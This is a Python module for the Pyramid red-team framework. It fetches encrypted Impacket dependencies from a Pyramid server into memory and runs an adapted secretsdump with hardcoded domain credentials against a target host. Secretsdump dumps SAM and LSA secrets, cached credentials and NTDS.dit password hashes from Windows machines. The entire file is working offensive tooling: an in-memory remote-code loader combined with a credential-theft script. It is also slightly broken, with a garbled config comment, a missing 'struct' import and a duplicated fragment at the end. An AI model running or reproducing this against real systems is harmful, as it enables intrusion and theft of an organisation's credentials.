'''
Author: Diego Capriotti @naksyn (c) 2022

Update 04-2023: bumped to work with Pyramid v.0.1

Description: Pyramid module for executing secretsdump.

-
Copyright 2022 naksyn
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, 
DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE 
OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

This script also contains an adaptation of https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py

'''

import os
import base64
import ssl
import importlib
import zipfile
import urllib.request
import sys
import io
import time
import logging
import ctypes
import inspect

### This config is gen### AUTO-GENERATED PYRAMID CONFIG ### DELIMITER

pyramid_server='192.168.1.280'
pyramid_port='443'
pyramid_user='test'
pyramid_pass='pass'
encryption='chacha20'
encryptionpass='chacha20'
chacha20IV=b'12345678'
pyramid_http='http'
encode_encrypt_url='/login/'

### END DELIMITER

###### CHANGE THIS BLOCK ##########

### GENERAL CONFIG ####

user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'

### Directory to which extract pyds dependencies (crypto, paramiko etc.) - can also be a Network Share e.g. \\\\share\\folder
### setting to False extract to current directory
extraction_dir=False

###### SECRETSDUMP CONFIG

username_domain="ADuser"
password_domain="Password1!"
domain_impacket="test.local"
target_host = "192.168.1.2"

#### DO NOT CHANGE BELOW THIS LINE #####


### ChaCha encryption

def yield_chacha20_xor_stream(key, iv, position=0):
  """Generate the xor stream with the ChaCha20 cipher."""
  if not isinstance(position, int):
    raise TypeError
  if position & ~0xffffffff:
    raise ValueError('Position is not uint32.')
  if not isinstance(key, bytes):
    raise TypeError
  if not isinstance(iv, bytes):
    raise TypeError
  if len(key) != 32:
    raise ValueError
  if len(iv) != 8:
    raise ValueError

  def rotate(v, c):
    return ((v << c) & 0xffffffff) | v >> (32 - c)

  def quarter_round(x, a, b, c, d):
    x[a] = (x[a] + x[b]) & 0xffffffff
    x[d] = rotate(x[d] ^ x[a], 16)
    x[c] = (x[c] + x[d]) & 0xffffffff
    x[b] = rotate(x[b] ^ x[c], 12)
    x[a] = (x[a] + x[b]) & 0xffffffff
    x[d] = rotate(x[d] ^ x[a], 8)
    x[c] = (x[c] + x[d]) & 0xffffffff
    x[b] = rotate(x[b] ^ x[c], 7)

  ctx = [0] * 16
  ctx[:4] = (1634760805, 857760878, 2036477234, 1797285236)
  ctx[4 : 12] = struct.unpack('<8L', key)
  ctx[12] = ctx[13] = position
  ctx[14 : 16] = struct.unpack('<LL', iv)
  while 1:
    x = list(ctx)
    for i in range(3):
      quarter_round(x, 0, 4,  8, 12)
      quarter_round(x, 1, 5,  9, 13)
      quarter_round(x, 2, 6, 10, 14)
      quarter_round(x, 3, 7, 11, 15)
      quarter_round(x, 0, 5, 10, 15)
      quarter_round(x, 1, 6, 11, 12)
      quarter_round(x, 2, 7,  8, 13)
      quarter_round(x, 3, 4,  9, 14)
    for c in struct.pack('<16L', *(
        (x[i] + ctx[i]) & 0xffffffff for i in range(16))):
      yield c
    ctx[12] = (ctx[12] + 1) & 0xffffffff
    if ctx[12] == 0:
      ctx[13] = (ctx[13] + 1) & 0xffffffff


def encrypt_chacha20(data, key, iv=None, position=0):
  """Encrypt (or decrypt) with the ChaCha20 cipher."""
  if not isinstance(data, bytes):
    raise TypeError
  if iv is None:
    iv = b'\0' * 8
  if isinstance(key, bytes):
    if not key:
      raise ValueError('Key is empty.')
    if len(key) < 32:
      # TODO(pts): Do key derivation with PBKDF2 or something similar.
      key = (key * (32 // len(key) + 1))[:32]
    if len(key) > 32:
      raise ValueError('Key too long.')

  return bytes(a ^ b for a, b in
      zip(data, yield_chacha20_xor_stream(key, iv, position)))

### XOR encryption

def encrypt(data, key):
    xored_data = []
    i = 0
    for data_byte in data:
        if i < len(key):
            xored_byte = data_byte ^ key[i]
            xored_data.append(xored_byte)
            i += 1
        else:
            xored_byte = data_byte ^ key[0]
            xored_data.append(xored_byte)
            i = 1
    return bytes(xored_data)


### Encryption wrapper ####

def encrypt_wrapper(data, encryption):
    if encryption == 'xor':
        result=encrypt(data, encryptionpass.encode())
        return result
    elif encryption == 'chacha20':
        result=encrypt_chacha20(data, encryptionpass.encode(),chacha20IV)
        return result

cwd=os.getcwd()

if not extraction_dir:
	extraction_dir=cwd
	
sys.path.insert(1,extraction_dir)


zip_name='secretsdump---Cryptodome'

print("[*] Downloading and unpacking on disk Cryptodome pyds dependencies on dir {}".format(extraction_dir))
gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
gcontext.check_hostname = False
gcontext.verify_mode = ssl.CERT_NONE
request = urllib.request.Request(pyramid_http + '://'+ pyramid_server + ':' + pyramid_port + encode_encrypt_url + \
          base64.b64encode((encrypt_wrapper((zip_name+'.zip').encode(), encryption))).decode('utf-8'), \
          headers={'User-Agent': user_agent})
base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
with urllib.request.urlopen(request, context=gcontext) as response:
   zip_web = response.read()

print("[*] Decrypting received file")   
zip_web= encrypt_wrapper(zip_web, encryption)

with zipfile.ZipFile(io.BytesIO(zip_web), 'r') as zip_ref:
    zip_ref.extractall(extraction_dir)
   

#### MODULE IMPORTER ####

moduleRepo = {}
_meta_cache = {}

# [0] = .py ext, is_package = False
# [1] = /__init__.py ext, is_package = True
_search_order = [('.py', False), ('/__init__.py', True)]

class ZipImportError(ImportError):
	"""Exception raised by zipimporter objects."""

# _get_info() = takes the fullname, then subpackage name (if applicable),
# and searches for the respective module or package

class CFinder(object):
	"""Import Hook"""
	def __init__(self, repoName):
		self.repoName = repoName
		self._source_cache = {}

	def _get_info(self, repoName, fullname):
		"""Search for the respective package or module in the zipfile object"""
		parts = fullname.split('.')
		submodule = parts[-1]
		modulepath = '/'.join(parts)

		#check to see if that specific module exists

		for suffix, is_package in _search_order:
			relpath = modulepath + suffix
			try:
				moduleRepo[repoName].getinfo(relpath)
			except KeyError:
				pass
			else:
				return submodule, is_package, relpath

		#Error out if we can find the module/package
		msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
		raise ZipImportError(msg)

	def _get_source(self, repoName, fullname):
		"""Get the source code for the requested module"""
		submodule, is_package, relpath = self._get_info(repoName, fullname)
		fullpath = '%s/%s' % (repoName, relpath)
		if relpath in self._source_cache:
			source = self._source_cache[relpath]
			return submodule, is_package, fullpath, source
		try:
			### added .decode
			source =  moduleRepo[repoName].read(relpath).decode()
			#print(source)
			source = source.replace('\r\n', '\n')
			source = source.replace('\r', '\n')
			self._source_cache[relpath] = source
			return submodule, is_package, fullpath, source
		except:
			raise ZipImportError("Unable to obtain source for module %s" % (fullpath))

	def find_module(self, fullname, path=None):

		try:
			submodule, is_package, relpath = self._get_info(self.repoName, fullname)
		except ImportError:
			return None
		else:
			return self

	def load_module(self, fullname):
		submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
		code = compile(source, fullpath, 'exec')
		spec = importlib.util.spec_from_loader(fullname, loader=None)
		mod = sys.modules.setdefault(fullname, importlib.util.module_from_spec(spec))
		mod.__loader__ = self
		mod.__file__ = fullpath
		mod.__name__ = fullname
		if is_package:
			mod.__path__ = [os.path.dirname(mod.__file__)]
		exec(code,mod.__dict__)
		return mod

	def get_data(self, fullpath):

		prefix = os.path.join(self.repoName, '')
		if not fullpath.startswith(prefix):
			raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
		relpath = fullpath[len(prefix):]
		try:
			return moduleRepo[self.repoName].read(relpath)
		except KeyError:
			raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

	def is_package(self, fullname):
		"""Return if the module is a package"""
		submodule, is_package, relpath = self._get_info(self.repoName, fullname)
		return is_package

	def get_code(self, fullname):
		submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
		return compile(source, fullpath, 'exec')

def install_hook(repoName):
	if repoName not in _meta_cache:
		finder = CFinder(repoName)
		_meta_cache[repoName] = finder
		sys.meta_path.append(finder)

def remove_hook(repoName):
	if repoName in _meta_cache:
		finder = _meta_cache.pop(repoName)
		sys.meta_path.remove(finder)

def hook_routine(fileName,zip_web):
	#print(zip_web)
	zf=zipfile.ZipFile(io.BytesIO(zip_web), 'r')
	#print(zf)
	moduleRepo[fileName]=zf
	install_hook(fileName)

zip_list=['secretsdump---setuptools', 'secretsdump---pkg_resources','secretsdump---jaraco','secretsdump---_distutils_hack', 'secretsdump---distutils', 'secretsdump---cffi', \
'secretsdump---configparser','secretsdump---future','secretsdump---chardet','secretsdump---flask','secretsdump---ldap3','secretsdump---ldapdomaindump','secretsdump---pyasn1', \
'secretsdump---OpenSSL','secretsdump---pyreadline','secretsdump---six','secretsdump---markupsafe','secretsdump---werkzeug','secretsdump---jinja2', 'secretsdump---click','secretsdump---itsdangerous',\
'secretsdump---dns', 'secretsdump---impacket']


	
for zip_name in zip_list:
    try:
        print("[*] Loading in memory module package: " + (zip_name.split('---')[-1] if '---' in zip_name else zip_name) )
        gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE
        request = urllib.request.Request(pyramid_http + '://'+ pyramid_server + ':' + pyramid_port + encode_encrypt_url + \
                  base64.b64encode((encrypt_wrapper((zip_name+'.zip').encode(), encryption))).decode('utf-8'), \
				  headers={'User-Agent': user_agent})
				  
        base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
        request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
        with urllib.request.urlopen(request, context=gcontext) as response:
            zip_web = response.read()
            print("[*] Decrypting received file") 
            zip_web= encrypt_wrapper(zip_web,encryption)
            hook_routine(zip_name, zip_web)

    except Exception as e:
        print(e)

print("[*] Modules imported")


#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Performs various techniques to dump hashes from the
#   remote machine without executing any agent there.
#   For SAM and LSA Secrets (including cached creds)
#   we try to read as much as we can from the registry
#   and then we save the hives in the target system
#   (%SYSTEMROOT%\\Temp dir) and read the rest of the
#   data from there.
#   For NTDS.dit we either:
#       a. Get the domain users list and get its hashes
#          and Kerberos keys using [MS-DRDS] DRSGetNCChanges()
#          call, replicating just the attributes we need.
#       b. Extract NTDS.dit via vssadmin executed  with the
#          smbexec approach.
#          It's copied on the temp dir and parsed remotely.
#
#   The script initiates the services required for its working
#   if they are not available (e.g. Remote Registry, even if it is
#   disabled). After the work is done, things are restored to the
#   original state.
#
# Author:
#   Alberto Solino (@agsolino)
#
# References:
#   Most of the work done by these guys. I just put all
#   the pieces together, plus some extra magic.
#
#   - https://github.com/gentilkiwi/kekeo/tree/master/dcsync
#   - https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
#   - https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
#   - https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
#   - https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13
#   - https://code.google.com/p/creddump/
#   - https://lab.mediaservice.net/code/cachedump.rb
#   - https://insecurety.net/?p=768
#   - https://web.archive.org/web/20190717124313/http://www.beginningtoseethelight.org/ntsecurity/index.htm
#   - https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf
#   - https://www.passcape.com/index.php?section=blog&cmd=details&id=15
#

#from __future__ import division
#from __future__ import print_function
import argparse
import codecs
import logging
import os
import sys

#from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection

from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
from impacket.krb5.keytab import Keytab
try:
    input = raw_input
except NameError:
    pass


print("[*] Executing Secretsdump on " + target_host + " as user "+ username_domain)

class DumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='', options=None):
        self.__useVSSMethod = options.use_vss
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__systemHive = options.system
        self.__bootkey = options.bootkey
        self.__securityHive = options.security
        self.__samHive = options.sam
        self.__ntdsFile = options.ntds
        self.__history = options.history
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = options.outputfile
        self.__doKerberos = options.k
        self.__justDC = options.just_dc
        self.__justDCNTLM = options.just_dc_ntlm
        self.__justUser = options.just_dc_user
        self.__pwdLastSet = options.pwd_last_set
        self.__printUserStatus= options.user_status
        self.__resumeFileName = options.resumefile
        self.__canProcessSAMLSA = True
        self.__kdcHost = options.dc_ip
        self.__options = options

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def dump(self):
        try:
            if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
                self.__isRemote = False
                self.__useVSSMethod = True
                if self.__systemHive:
                    localOperations = LocalOperations(self.__systemHive)
                    bootKey = localOperations.getBootKey()
                    if self.__ntdsFile is not None:
                    # Let's grab target's configuration about LM Hashes storage
                        self.__noLMHash = localOperations.checkNoLMHashPolicy()
                else:
                    import binascii
                    bootKey = binascii.unhexlify(self.__bootkey)

            else:
                self.__isRemote = True
                bootKey = None
                try:
                    try:
                        self.connect()
                    except Exception as e:
                        if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                            # SMBConnection failed. That might be because there was no way to log into the
                            # target system. We just have a last resort. Hope we have tickets cached and that they
                            # will work
                            logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                            pass
                        else:
                            raise

                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
                    self.__remoteOps.setExecMethod(self.__options.exec_method)
                    if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:
                        self.__remoteOps.enableRegistry()
                        bootKey             = self.__remoteOps.getBootKey()
                        # Let's check whether target system stores LM Hashes
                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
                except Exception as e:
                    self.__canProcessSAMLSA = False
                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                        and self.__doKerberos is True:
                        # Giving some hints here when SPN target name validation is set to something different to Off
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                        logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
                    else:
                        logging.error('RemoteOperations failed: %s' % str(e))

            # If RemoteOperations succeeded, then we can extract SAM and LSA
            if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
                try:
                    if self.__isRemote is True:
                        SAMFileName         = self.__remoteOps.saveSAM()
                    else:
                        SAMFileName         = self.__samHive

                    self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
                    self.__SAMHashes.dump()
                    if self.__outputFileName is not None:
                        self.__SAMHashes.export(self.__outputFileName)
                except Exception as e:
                    logging.error('SAM hashes extraction failed: %s' % str(e))

                try:
                    if self.__isRemote is True:
                        SECURITYFileName = self.__remoteOps.saveSECURITY()
                    else:
                        SECURITYFileName = self.__securityHive

                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                   isRemote=self.__isRemote, history=self.__history)
                    self.__LSASecrets.dumpCachedHashes()
                    if self.__outputFileName is not None:
                        self.__LSASecrets.exportCached(self.__outputFileName)
                    self.__LSASecrets.dumpSecrets()
                    if self.__outputFileName is not None:
                        self.__LSASecrets.exportSecrets(self.__outputFileName)
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logging.error('LSA hashes extraction failed: %s' % str(e))

            # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
            if self.__isRemote is True:
                if self.__useVSSMethod and self.__remoteOps is not None:
                    NTDSFileName = self.__remoteOps.saveNTDS()
                else:
                    NTDSFileName = None
            else:
                NTDSFileName = self.__ntdsFile

            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
                                           noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                           useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                           pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
                                           outputFileName=self.__outputFileName, justUser=self.__justUser,
                                           printUserStatus= self.__printUserStatus)
            try:
                self.__NTDSHashes.dump()
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                    resumeFile = self.__NTDSHashes.getResumeSessionFile()
                    if resumeFile is not None:
                        os.unlink(resumeFile)
                logging.error(e)
                if self.__justUser and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >=0:
                    logging.info("You just got that error because there might be some duplicates of the same name. "
                                 "Try specifying the domain name for the user as well. It is important to specify it "
                                 "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
                elif self.__useVSSMethod is False:
                    logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
            self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            if self.__NTDSHashes is not None:
                if isinstance(e, KeyboardInterrupt):
                    while True:
                        answer =  input("Delete resume session file? [y/N] ")
                        if answer.upper() == '':
                            answer = 'N'
                            break
                        elif answer.upper() == 'Y':
                            answer = 'Y'
                            break
                        elif answer.upper() == 'N':
                            answer = 'N'
                            break
                    if answer == 'Y':
                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
            try:
                self.cleanup()
            except:
                pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()


# Process command-line arguments.
if __name__ == '__main__':
    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    #print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from "
                                                      "the remote machine without executing any agent there.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                       ' (if you want to parse local files)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-system', action='store', help='SYSTEM hive to parse')
    parser.add_argument('-bootkey', action='store', help='bootkey for SYSTEM hive')
    parser.add_argument('-security', action='store', help='SECURITY hive to parse')
    parser.add_argument('-sam', action='store', help='SAM hive to parse')
    parser.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
    parser.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
                         'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
                         'state')
    parser.add_argument('-outputfile', action='store',
                        help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
    parser.add_argument('-use-vss', action='store_true', default=False,
                        help='Use the VSS method insead of default DRSUAPI')
    parser.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
                        'method to use at target (only when using -use-vss). Default: smbexec')
    group = parser.add_argument_group('display options')
    group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                       help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                            'Implies also -just-dc switch')
    group.add_argument('-just-dc', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
    group.add_argument('-just-dc-ntlm', action='store_true', default=False,
                       help='Extract only NTDS.DIT data (NTLM hashes only)')
    group.add_argument('-pwd-last-set', action='store_true', default=False,
                       help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
    group.add_argument('-user-status', action='store_true', default=False,
                        help='Display whether or not the user is disabled')
    group.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                             ' the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                            ' (128 or 256 bits)')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                 'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')

    #if len(sys.argv)==1:
    #    parser.print_help()
    #    sys.exit(1)

    target_string= domain_impacket + '/' + username_domain + ':' + password_domain + '@' + target_host
    options = parser.parse_args([target_string])


    # Init the example's logger theme
    logger.init(options.ts)

    #if options.debug is True:
    #    logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
    #    logging.debug(version.getInstallationPath())
    #else:
    logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.target)

    if options.just_dc_user is not None:
        if options.use_vss is True:
            logging.error('-just-dc-user switch is not supported in VSS mode')
            sys.exit(1)
        elif options.resumefile is not None:
            logging.error('resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch')
            sys.exit(1)
        elif remoteName.upper() == 'LOCAL' and username == '':
            logging.error('-just-dc-user not compatible in LOCAL mode')
            sys.exit(1)
        else:
            # Having this switch on implies not asking for anything else.
            options.just_dc = True

    if options.use_vss is True and options.resumefile is not None:
        logging.error('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
        sys.exit(1)

    if remoteName.upper() == 'LOCAL' and username == '' and options.resumefile is not None:
        logging.error('resuming a previous NTDS.DIT dump session is not supported in LOCAL mode')
        sys.exit(1)

    if remoteName.upper() == 'LOCAL' and username == '':
        if options.system is None and options.bootkey is None:
            logging.error('Either the SYSTEM hive or bootkey is required for local parsing, check help')
            sys.exit(1)
    else:

        if options.target_ip is None:
            options.target_ip = remoteName

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

    dumper = DumpSecrets(remoteName, username, password, domain, options)
    try:
        dumper.dump()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)
int_exc()
        logging.error(e)
